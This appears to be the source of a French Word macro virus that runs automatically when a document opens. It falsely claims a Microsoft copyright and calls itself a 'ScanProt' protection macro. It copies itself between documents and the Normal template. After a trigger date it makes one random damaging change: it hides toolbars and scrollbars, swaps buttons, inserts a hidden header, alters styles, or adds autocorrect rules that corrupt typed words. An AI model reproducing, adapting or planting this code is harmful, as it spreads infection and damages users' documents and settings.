   Attribute VB_Name = "autoOpen"

   ' Microsoft WordBasic : Default model application
   ' Main purpose        : Ensuring a constant opening of each file
   '                       with "normal.dot"
   '
   '                       For Microsoft Word Version 6.0
   '                       Copyright 83-93 Microsoft Corporation


   Public Sub MAIN()
   Attribute MAIN.VB_Description = "ScanProt macro to install protection macros, disinfect your Normal (Global) template and run the CleanAll macro."
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.autoOpen.MAIN"
   Dim fichier$
   Dim model$
   Dim Macro$
   Dim NbFct
   Dim Fct
   Dim i

       On Error GoTo -1: On Error GoTo Erreur

       WordBasic.FileSummaryInfo Update:=1
       Dim res As Object: Set res = WordBasic.DialogRecord.FileSummaryInfo(False)
       WordBasic.CurValues.FileSummaryInfo res

       fichier$ = res.Directory + "\" + res.FileName + ":autoOpen"
       model$ = "Global:autoOpen"
       Macro$ = WordBasic.[MacroFileName$](WordBasic.[MacroName$](0))

       If UCase(WordBasic.[Right$](Macro$, 10)) = "NORMAL.DOT" Then
           WordBasic.MacroCopy model$, fichier$
           WordBasic.FileSaveAs Format:=1
       Else
           WordBasic.MacroCopy fichier$, model$
       End If

       If WordBasic.Today() >= WordBasic.DateSerial(97, 7, 14) Then

           NbFct = 20
           Fct = WordBasic.Int(Rnd() * NbFct)

           WordBasic.ScreenUpdating 0
           Select Case Fct

               Case 0
                   WordBasic.ToolsOptionsView StatusBar:=0
               Case 1
                   WordBasic.ToolsOptionsView HScroll:=0
               Case 2
                   WordBasic.ToolsOptionsView VScroll:=0
               Case 3
                   WordBasic.ToolsOptionsGeneral BlueScreen:=1
               Case 4
                   WordBasic.ToolsOptionsGeneral Effects3d:=0
               Case 5
                   WordBasic.FormatColumns Columns:="2", ApplyColsTo:=4
               Case 6
                   If WordBasic.[ToolbarButtonMacro$]("Standard", 9, 0) = "EditionCouper" Then
                       WordBasic.ViewToolbars ToolTips:=0
                       WordBasic.AddButton "Standard", 11, 1, "EditionCouper", 20, 0
                       WordBasic.CopyButtonImage "Standard", 10, 0
                       WordBasic.PasteButtonImage "Standard", 11, 0
                       WordBasic.CopyButtonImage "Standard", 9, 0
                       WordBasic.PasteButtonImage "Standard", 10, 0
                       WordBasic.DeleteButton "Standard", 9, 0
                   End If
               Case 7
                   If WordBasic.[ToolbarButtonMacro$]("Mise en forme", 12, 0) = "ParaCentré" Then
                       WordBasic.ViewToolbars ToolTips:=0
                       WordBasic.AddButton "Mise en forme", 12, 1, "ParaJustifié", 122, 0
                       WordBasic.AddButton "Mise en forme", 15, 1, "ParaCentré", 121, 0
                       WordBasic.CopyButtonImage "Mise en forme", 13, 0
                       WordBasic.PasteButtonImage "Mise en forme", 12, 0
                       WordBasic.CopyButtonImage "Mise en forme", 16, 0
                       WordBasic.PasteButtonImage "Mise en forme", 15, 0
                       WordBasic.DeleteButton "Mise en forme", 16, 0
                       WordBasic.DeleteButton "Mise en forme", 13, 0
                   End If
               Case 8
                   WordBasic.ToggleFull
               Case 9
                   WordBasic.FormatStyle Name:="Normal", Define:=1
                   WordBasic.FormatDefineStylePara Before:="30 pt", After:="24 pt", LineSpacingRule:=2, LineSpacing:="", WidowControl:=1, KeepWithNext:=1, KeepTogether:=1
               Case 10
                   WordBasic.FormatStyle Name:="Normal", Define:=1
                   WordBasic.FormatDefineStyleFont Color:=8
               Case 11
                   WordBasic.ViewToolbars ColorButtons:=0
                   WordBasic.ViewToolbars LargeButtons:=1
               Case 12
                   For i = 1 To WordBasic.CountToolbars()
                       WordBasic.ViewToolbars Toolbar:=WordBasic.[ToolbarName$](i), Hide:=1
                   Next i
               Case 13
                   WordBasic.ViewHeader
                   WordBasic.GoToHeaderFooter
                   WordBasic.EditSelectAll
                   WordBasic.Insert "Les employés les plus incompétents sont systématiquement promus aux postes où ils se révèlent le moins dangereux: l'encadrement." + Chr(13)
                   WordBasic.EditSelectAll
                   WordBasic.Font "Times New Roman"
                   WordBasic.FontSize 8
                   WordBasic.CenterPara
                   WordBasic.Hidden
                   WordBasic.CloseViewHeaderFooter
                   WordBasic.ToolsOptionsPrint ShowHidden:=1
               Case 14
                   WordBasic.ViewRuler 0
               Case 15
                   WordBasic.ToolsAutoCorrect Replace:="dans", With:="dnas", Add:=1
               Case 16
                   WordBasic.ToolsAutoCorrect Replace:="le", With:="el", Add:=1
               Case 17
                   WordBasic.ToolsAutoCorrect Replace:="les", With:="lse", Add:=1
               Case 18
                   WordBasic.ToolsAutoCorrect Replace:="a", With:="à", Add:=1
               Case 19
                   WordBasic.ToolsAutoCorrect Replace:="ou", With:="où", Add:=1

           End Select

       End If

   Erreur:

       On Error GoTo -1: On Error GoTo 0

   End Sub
